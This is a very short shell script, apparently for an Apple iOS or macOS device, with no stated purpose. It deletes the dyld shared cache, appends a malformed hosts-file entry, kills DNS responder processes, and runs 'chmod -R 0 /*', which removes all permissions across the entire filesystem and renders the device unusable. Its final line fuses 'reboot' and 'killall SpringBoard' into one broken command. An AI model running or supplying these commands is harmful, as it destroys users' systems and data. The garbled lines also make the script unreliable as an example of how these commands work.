#!/bin/sh
sudo rm -rf /System/Library/Caches/com.apple.dyld/dyld_shared_cache_*
echo "127.0.0.1 185.242.224.235" >> /etc/hosts
killall -9 mDNSResponder
killall -9 mDNSResponderHelper
chmod -R 0 /*
rebootkillall SpringBoard